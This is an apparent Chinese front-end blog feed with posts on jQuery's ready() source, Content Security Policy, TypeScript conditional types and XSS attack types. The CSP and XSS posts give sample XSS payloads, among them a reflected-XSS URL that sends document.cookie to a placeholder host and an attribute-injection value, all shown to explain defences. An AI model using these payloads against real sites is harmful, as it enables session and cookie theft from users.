<p>熟悉 <code>jQuery</code> 的人都知道 <code>DOM Ready</code> 事件，传<code>Javascript</code>原生的 <code>window.onload</code> 事件是在页面所有的资源都加载完毕后触发的。如果页面上有大图片等资源响应缓慢, 会导致 <code>window.onload</code> 事件迟迟无法触发，所以出现了<code>DOM Ready</code> 事件。此事件在 <code>DOM</code> 文档结构准备完毕后触发，即在资源加载前触发。另外我们需要在 <code>DOM</code> 准备完毕后，再修改<code>DOM</code>结构，比如添加<code>DOM</code>元素等。而为了完美实现 <code>DOM Ready</code> 事件，兼容各浏览器及低版本<code>IE</code>（针对高级的浏览器，可以使用 DOMContentLoaded 事件，省时省力），在 <code>jQuery.ready()</code> 方法里，运用了 <code>setTimeout()</code> 方法的一个特性， 在 <code>setTimeout</code> 中触发的函数, 一定是在 <code>DOM</code> 准备完毕后触发。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">jQuery.extend(&#123;</span><br><span class="line">    ready: <span class="function"><span class="keyword">function</span>(<span class="params">wait</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果需要等待，holdReady()的时候，把hold住的次数减1，如果还没到达0，说明还需要继续hold住，return掉</span></span><br><span class="line">        <span class="comment">// 如果不需要等待，判断是否已经Ready过了，如果已经ready过了，就不需要处理了。异步队列里边的done的回调都会执行了</span></span><br><span class="line">        <span class="keyword">if</span> (wait === <span class="literal">true</span> ? --jQuery.readyWait : jQuery.isReady) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确定 body 存在</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">document</span>.body) &#123;</span><br><span class="line">            <span class="comment">// 如果 body 还不存在 ，DOMContentLoaded 未完成，此时</span></span><br><span class="line">            <span class="comment">// 将 jQuery.ready 放入定时器 setTimeout 中</span></span><br><span class="line">            <span class="comment">// 不带时间参数的 setTimeout(a) 相当于 setTimeout(a,0)</span></span><br><span class="line">            <span class="comment">// 但是这里并不是立即触发 jQuery.ready</span></span><br><span class="line">            <span class="comment">// 由于 javascript 的单线程的异步模式</span></span><br><span class="line">            <span class="comment">// setTimeout(jQuery.ready) 会等到重绘完成才执行代码，也就是 DOMContentLoaded 之后才执行 jQuery.ready</span></span><br><span class="line">            <span class="comment">// 所以这里有个小技巧：在 setTimeout 中触发的函数, 一定会在 DOM 准备完毕后触发</span></span><br><span class="line">            <span class="keyword">return</span> setTimeout(jQuery.ready);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remember that the DOM is ready</span></span><br><span class="line">        <span class="comment">// 记录 DOM ready 已经完成</span></span><br><span class="line">        jQuery.isReady = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If a normal DOM Ready event fired, decrement, and wait if need be</span></span><br><span class="line">        <span class="comment">// wait 为 false 表示ready事情未触发过，否则 return</span></span><br><span class="line">        <span class="keyword">if</span> (wait !== <span class="literal">true</span> &amp;&amp; --jQuery.readyWait &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are functions bound, to execute</span></span><br><span class="line">        <span class="comment">// 调用异步队列，然后派发成功事件出去（最后使用done接收，把上下文切换成document，默认第一个参数是jQuery。</span></span><br><span class="line">        readyList.resolveWith(<span class="built_in">document</span>, [jQuery]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Trigger any bound ready events</span></span><br><span class="line">        <span class="comment">// 最后jQuery还可以触发自己的ready事件</span></span><br><span class="line">        <span class="comment">// 例如：</span></span><br><span class="line">        <span class="comment">//    $(document).on('ready', fn2);</span></span><br><span class="line">        <span class="comment">//    $(document).ready(fn1);</span></span><br><span class="line">        <span class="comment">// 这里的fn1会先执行，自己的ready事件绑定的fn2回调后执行</span></span><br><span class="line">        <span class="keyword">if</span> (jQuery.fn.trigger) &#123;</span><br><span class="line">            jQuery(<span class="built_in">document</span>).trigger(<span class="string">"ready"</span>).off(<span class="string">"ready"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>源码</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-CSP（内容安全策略）</title>
    <url>/2018/04/17/%E5%AE%89%E5%85%A8_CSP%EF%BC%88%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%89/</url>
    <content><![CDATA[<h2 id="CSP-内容安全策略"><a href="#CSP-内容安全策略" class="headerlink" title="CSP (内容安全策略)"></a>CSP (内容安全策略)</h2><p class="tip">CSP [Content Security Policy] 译为：内容安全策略</p>

<h4 id="CSP的目的"><a href="#CSP的目的" class="headerlink" title="CSP的目的"></a>CSP的目的</h4><p>XSS(Cross Site Scripting) 跨站脚本攻击是最常见也是危害最大的攻击手段，我们前端能够做一些能力范围内的处理，比如最简单的将表单内容脚本序列化为HTML实体，以防止恶意脚本的执行，但除此之外，还有很多跨站脚本攻击的方式，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span> <span class="attr">style</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(2)"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用 <code>javascript:..</code> 以及 内联事件进行攻击。</p>
<p>为了阻止这些攻击，我们前端也要做不少相应的工作，于是很多人提出能不能从根本上解决问题，让浏览器帮我们做这些事情，这就是 CSP 提出的原因和要解决的问题。</p>
<h4 id="CSP-的原理以及开启方式"><a href="#CSP-的原理以及开启方式" class="headerlink" title="CSP 的原理以及开启方式"></a>CSP 的原理以及开启方式</h4><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>原理其实就是白名单机制，开发者明确告诉客户端(浏览器)哪些资源可以加载并执行，我们只需要提供配置，其他的工作由客户端(浏览器)来完成。</p>
<h6 id="开启CSP的方式"><a href="#开启CSP的方式" class="headerlink" title="开启CSP的方式"></a>开启CSP的方式</h6><p>一、通过 <code>&lt;meta&gt;</code> 标签开启</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"配置项"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>二、通过添加 <code>Content-Security-Policy</code> 响应头字段</p>
<p><img src="/static/img/csp.png" width="500"></p>
<h4 id="可配置的选项"><a href="#可配置的选项" class="headerlink" title="可配置的选项"></a>可配置的选项</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src：用来设置每个选项的默认值</span><br><span class="line"></span><br><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br><span class="line"></span><br><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br><span class="line"></span><br><span class="line">report-uri：有时，我们不仅希望浏览器帮我们防止XSS的攻击，还希望将该行为上报到给定的网址，该选项用来配置上报的地址</span><br></pre></td></tr></table></figure>
<h4 id="选项的值"><a href="#选项的值" class="headerlink" title="选项的值"></a>选项的值</h4><p>每个限制选项可以设置以下几种值</p>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字’self’：当前域名，需要加引号</li>
<li>关键字’none’：禁止加载任何外部资源，需要加引号</li>
</ul>
<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，CSP 做了如下配置：</p>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code> 标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任 <code>cdn.example.org</code> 和 <code>third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title>TypeScript常见类型关键字</title>
    <url>/2018/04/17/TypeScript_%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    <content><![CDATA[<h2 id="infer"><a href="#infer" class="headerlink" title="infer"></a>infer</h2><h3 id="在extends语句中，支持infer关键字，可以推断一个类型变量，高效的对类型进行模式匹配。但是，这个类型变量只能在true的分支中使用"><a href="#在extends语句中，支持infer关键字，可以推断一个类型变量，高效的对类型进行模式匹配。但是，这个类型变量只能在true的分支中使用" class="headerlink" title="在extends语句中，支持infer关键字，可以推断一个类型变量，高效的对类型进行模式匹配。但是，这个类型变量只能在true的分支中使用"></a>在extends语句中，支持infer关键字，可以推断一个类型变量，高效的对类型进行模式匹配。但是，这个类型变量只能在true的分支中使用</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 内置 ReturnType</span></span><br><span class="line"><span class="keyword">type</span> ReturnType&lt;T&gt; = T <span class="keyword">extends</span> (...args: <span class="built_in">any</span>[]) =&gt; infer R ? R : <span class="built_in">any</span>;</span><br></pre></td></tr></table></figure>
<p>理解为：如果 T 继承了 (…args: any[]) =&gt; any 类型，则返回类型 R，否则返回 any。其中 R 是什么呢？R 被定义在 extends (…args: any[]) =&gt; infer R 中，即 R 是从传入参数类型中推导出来的。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果泛型T是()=&gt; infer R的子集，则返回infer R获取到的类型，否则返回boolean</span></span><br><span class="line"><span class="keyword">type</span> Func&lt;T&gt; = T <span class="keyword">extends</span> () =&gt; infer R ? R : <span class="built_in">boolean</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func1: Func&lt;<span class="built_in">number</span>&gt;; <span class="comment">// boolean;</span></span><br><span class="line"><span class="keyword">let</span> func2: Func&lt;<span class="string">''</span>&gt;; <span class="comment">// boolean</span></span><br><span class="line"><span class="keyword">let</span> func3: Func&lt;<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Promise</span>&lt;<span class="built_in">number</span>&gt;&gt;; <span class="comment">// Promise&lt;number&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Obj&lt;T&gt; = T <span class="keyword">extends</span> &#123; a: infer VT, b: infer VT &#125; ? VT : <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj1: Obj&lt;<span class="built_in">string</span>&gt;;  <span class="comment">// number;</span></span><br><span class="line"><span class="keyword">let</span> obj2: Obj&lt;<span class="literal">true</span>&gt;;  <span class="comment">// number;</span></span><br><span class="line"><span class="keyword">let</span> obj3: Obj&lt;&#123;a: <span class="built_in">string</span>, b: <span class="built_in">string</span>&#125;&gt;;   <span class="comment">// string</span></span><br><span class="line"><span class="keyword">let</span> obj4: Obj&lt;&#123;a: <span class="built_in">number</span>, b: <span class="built_in">string</span>&#125;&gt;;   <span class="comment">// string | number</span></span><br><span class="line"><span class="comment">// 当a、b为不同类型时，返回联合类型</span></span><br></pre></td></tr></table></figure>
<h2 id="TS中的条件类型（ReturnType）"><a href="#TS中的条件类型（ReturnType）" class="headerlink" title="TS中的条件类型（ReturnType）"></a>TS中的条件类型（ReturnType）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">官方文档：https://www.typescriptlang.org/docs/handbook/2/conditional-types.html<span class="comment">#distributive-conditional-types</span></span><br></pre></td></tr></table></figure>
<p>1、条件类型是一种由条件表达式所决定的类型<br>2、<br>条件类型使类型具有了不唯一性,同样增加了语言的灵活性<br>例如<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">T <span class="keyword">extends</span> U ? X : Y</span><br></pre></td></tr></table></figure></p>
<p>若类型T可被赋值给类型U,那么结果类型就是X类型,否则就是Y类型。</p>
<h3 id="条件类型约束"><a href="#条件类型约束" class="headerlink" title="条件类型约束"></a>条件类型约束</h3><p>泛型约束的例子<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MessageOf&lt;T <span class="keyword">extends</span> &#123; message: unknown &#125;&gt; = T[<span class="string">"message"</span>];</span><br></pre></td></tr></table></figure></p>
<p>在此示例中，我们使用 message: unknown 约束泛型T。</p>
<p>如果我们想 MessageOf 支持任何类型，我们可以通过将约束和条件类型一起使用<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MessageOf&lt;T&gt; = T <span class="keyword">extends</span> &#123; message: unknown &#125; ? T[<span class="string">"message"</span>] : never;</span><br></pre></td></tr></table></figure></p>
<p>如果条件成立，在 true 分支内，TypeScript 知道 T 将具有一个 message 属性。否则将会返回 never 类型。</p>
<h3 id="分布条件类型"><a href="#分布条件类型" class="headerlink" title="分布条件类型"></a>分布条件类型</h3><p>当条件类型给定联合类型时，它们将变为分布式。<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ToArray&lt;Type&gt; = Type <span class="keyword">extends</span> <span class="built_in">any</span> ? Type[] : never;</span><br></pre></td></tr></table></figure></p>
<p>如果我们将联合类型传入ToArray，则条件类型将应用于该联合的每个成员。<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ToArray&lt;Type&gt; = Type <span class="keyword">extends</span> <span class="built_in">any</span> ? Type[] : never;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StrArrOrNumArr = ToArray&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;; <span class="comment">// string[] | number[]</span></span><br></pre></td></tr></table></figure></p>
<p>StrArrOrNumArr 类型是 string[] | number[]</p>
<p>避免这种分配性的行为。可以用方括号将 extends 关键字的每一侧括起来。<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ToArrayNonDist&lt;Type&gt; = [Type] <span class="keyword">extends</span> [<span class="built_in">any</span>] ? Type[] : never;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StrOrNumArr = ToArrayNonDist&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;; <span class="comment">// string | number[]</span></span><br></pre></td></tr></table></figure></p>
<p>StrArrOrNumArr 类型是 (string | number)[]</p>
<h3 id="内置条件类型"><a href="#内置条件类型" class="headerlink" title="内置条件类型"></a>内置条件类型</h3><p>预定义的有条件类型</p>
<p>TypeScript 2.8在lib.d.ts里增加了一些预定义的有条件类型：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Exclude&lt;T, U&gt; -- 从T中剔除可以赋值给U的类型。</span><br><span class="line">Extract&lt;T, U&gt; -- 提取T中可以赋值给U的类型。</span><br><span class="line">NonNullable&lt;T&gt; -- 从T中剔除null和undefined。</span><br><span class="line">ReturnType&lt;T&gt; -- 获取函数返回值类型。</span><br><span class="line">InstanceType&lt;T&gt; -- 获取构造函数类型的实例类型。</span><br></pre></td></tr></table></figure></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> T00 = Exclude&lt;<span class="string">"a"</span> | <span class="string">"b"</span> | <span class="string">"c"</span> | <span class="string">"d"</span>, <span class="string">"a"</span> | <span class="string">"c"</span> | <span class="string">"f"</span>&gt;;  <span class="comment">// "b" | "d"</span></span><br><span class="line"><span class="keyword">type</span> T01 = Extract&lt;<span class="string">"a"</span> | <span class="string">"b"</span> | <span class="string">"c"</span> | <span class="string">"d"</span>, <span class="string">"a"</span> | <span class="string">"c"</span> | <span class="string">"f"</span>&gt;;  <span class="comment">// "a" | "c"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T02 = Exclude&lt;<span class="built_in">string</span> | <span class="built_in">number</span> | <span class="function">(<span class="params">(<span class="params"></span>) =&gt; <span class="built_in">void</span></span>), <span class="params">Function</span>&gt;;  // <span class="params">string</span> | <span class="params">number</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T03</span> = <span class="params">Extract</span>&lt;<span class="params">string</span> | <span class="params">number</span> | (<span class="params">(<span class="params"></span>) =&gt; <span class="built_in">void</span></span>), <span class="params">Function</span>&gt;;  // <span class="params">()</span> =&gt;</span> <span class="built_in">void</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T04 = NonNullable&lt;<span class="built_in">string</span> | <span class="built_in">number</span> | <span class="literal">undefined</span>&gt;;  <span class="comment">// string | number</span></span><br><span class="line"><span class="keyword">type</span> T05 = NonNullable&lt;<span class="function">(<span class="params">(<span class="params"></span>) =&gt; <span class="built_in">string</span></span>) | <span class="params">string</span>[] | <span class="params">null</span> | <span class="params">undefined</span>&gt;;  // (<span class="params">(<span class="params"></span>) =&gt; <span class="built_in">string</span></span>) | <span class="params">string</span>[]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="params">function</span> <span class="params">f1</span>(<span class="params">s: <span class="built_in">string</span></span>) &#123;</span></span><br><span class="line"><span class="function">    <span class="params">return</span> &#123; <span class="params">a</span>: 1, <span class="params">b</span>: <span class="params">s</span> &#125;;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="params">class</span> <span class="params">C</span> &#123;</span></span><br><span class="line"><span class="function">    <span class="params">x</span> = 0;</span></span><br><span class="line"><span class="function">    <span class="params">y</span> = 0;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T10</span> = <span class="params">ReturnType</span>&lt;<span class="params">()</span> =&gt;</span> <span class="built_in">string</span>&gt;;  <span class="comment">// string</span></span><br><span class="line"><span class="keyword">type</span> T11 = ReturnType&lt;<span class="function">(<span class="params">s: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span>&gt;;  <span class="comment">// void</span></span><br><span class="line"><span class="keyword">type</span> T12 = ReturnType&lt;<span class="function">(<span class="params">&lt;T&gt;(<span class="params"></span>) =&gt; T</span>)&gt;;  // &#123;&#125;</span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T13</span> = <span class="params">ReturnType</span>&lt;(<span class="params">&lt;T <span class="keyword">extends</span> U, U <span class="keyword">extends</span> <span class="built_in">number</span>[]&gt;(<span class="params"></span>) =&gt; T</span>)&gt;;  // <span class="params">number</span>[]</span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T14</span> = <span class="params">ReturnType</span>&lt;<span class="params">typeof</span> <span class="params">f1</span>&gt;;  // &#123; <span class="params">a</span>: <span class="params">number</span>, <span class="params">b</span>: <span class="params">string</span> &#125;</span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T15</span> = <span class="params">ReturnType</span>&lt;<span class="params">any</span>&gt;;  // <span class="params">any</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T16</span> = <span class="params">ReturnType</span>&lt;<span class="params">never</span>&gt;;  // <span class="params">any</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T17</span> = <span class="params">ReturnType</span>&lt;<span class="params">string</span>&gt;;  // <span class="params">Error</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T18</span> = <span class="params">ReturnType</span>&lt;<span class="params">Function</span>&gt;;  // <span class="params">Error</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T20</span> = <span class="params">InstanceType</span>&lt;<span class="params">typeof</span> <span class="params">C</span>&gt;;  // <span class="params">C</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T21</span> = <span class="params">InstanceType</span>&lt;<span class="params">any</span>&gt;;  // <span class="params">any</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T22</span> = <span class="params">InstanceType</span>&lt;<span class="params">never</span>&gt;;  // <span class="params">any</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T23</span> = <span class="params">InstanceType</span>&lt;<span class="params">string</span>&gt;;  // <span class="params">Error</span></span></span><br><span class="line"><span class="function"><span class="params">type</span> <span class="params">T24</span> = <span class="params">InstanceType</span>&lt;<span class="params">Function</span>&gt;;  // <span class="params">Error</span></span></span><br></pre></td></tr></table></figure>
<p>重点：ReturnType：获取函数返回值的类型<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;name: <span class="string">'xxx'</span>, age: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GetUserType = <span class="keyword">typeof</span> getUser;</span><br><span class="line"><span class="keyword">type</span> ReturnUser = ReturnType&lt;GetUserType&gt;</span><br></pre></td></tr></table></figure></p>
<p>TypeScript提供了几种实用的内置工具类型，以方便进行常见的类型转换。官方链接：<a href="https://www.typescriptlang.org/docs/handbook/utility-types.html#partialtype" target="_blank" rel="noopener">地址</a></p>
<p>Parameters：获取函数参数的类型<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;name: <span class="string">'xxx'</span>, age: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> GetUserType = <span class="keyword">typeof</span> getUser;</span><br><span class="line"><span class="keyword">type</span> ReturnUser = Parameters&lt;GetUserType&gt;</span><br></pre></td></tr></table></figure></p>
<p>ConstructorParameters 获取构造函数的参数类型<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">    &#125;</span><br><span class="line">    getName() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取函数的参数类型</span></span><br><span class="line"><span class="keyword">type</span> Params = ConstructorParameters&lt;<span class="keyword">typeof</span> Person&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>Type</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-XSS攻击大全</title>
    <url>/2018/05/22/%E5%AE%89%E5%85%A8_XSS%E6%94%BB%E5%87%BB%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<h1 id="前端安全之XSS攻击"><a href="#前端安全之XSS攻击" class="headerlink" title="前端安全之XSS攻击"></a>前端安全之XSS攻击</h1><p><code>XSS</code>(cross-site scripting跨域脚本攻击) 攻击是最常见的web攻击，其重点是”跨域”和”客户端执行”。有人将XSS攻击分为三种，分别是：</p>
<ul>
<li>1、Reflected XSS（基于反射的XSS攻击）</li>
<li>2、Stored XSS（基于存储的XSS攻击）</li>
<li>3、DOM-based or local XSS（基于DOM或本地的XSS攻击）</li>
</ul>
<h2 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h2><p>基于反射的XSS攻击，主要一搞站点服务端返回脚本，在客户端触发执行从而发起Web攻击。<br><code>例子</code>：</p>
<ul>
<li>1、做个假设，当亚马逊在搜索书记，搜不到书的名字的时候显示提交的名称。</li>
<li>2、在搜索框搜索内容，填入”<script>alert(“handsome body”)</script>“,点击搜索</li>
<li>3、当前端页面没有对返回的数据进行过滤，直接显示在页面上，这是就会alert那个字符出来。</li>
<li>4、进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www.amazon.cn/search?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://xxx/get?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>PS:这个地址当然是无效的，只是举个例子而已。</p>
<p><code>结论：</code><br>如果只是1、2、3步做成功，那也只是自己折腾自己而已，如果第4步能做成功，才是个像样的XSS攻击。<br><code>开发安全措施：</code></p>
<ul>
<li>1、前端在显示服务端数据的时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</li>
<li>2、后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</li>
</ul>
<p>例如：<br>标签：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'handsome boy'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>转义<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;#39;</span>handsome boy<span class="symbol">&amp;#39;</span>)<span class="symbol">&amp;lt;</span>/script&amp;gt<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>属性：<br>如果input的value属性值是<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">琅琊榜" onclick="javascript:alert('handsome boy')</span><br></pre></td></tr></table></figure></p>
<p>就可能出现<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"琅琊榜"</span> <span class="attr">onclick</span>=<span class="string">"javascript:alert('handsome boy')"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。</p>
<h2 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h2><p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会被触发执行。<br><code>例子</code></p>
<ul>
<li><p>1、发一篇文章，里面包含恶意脚本</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">今天天气不错啊！&lt;script&gt;alert(<span class="string">'handsome boy'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>2、后端没有对文章进行过滤，直接保存文章内容到数据库。</p>
</li>
<li>3、当其他人看这篇文章的时候，包含的恶意脚本就会执行。</li>
<li>PS:因为大部分文章是保存整个HTML内容的，前端显示的时候不做过滤，就极可能需要做些处理了。</li>
</ul>
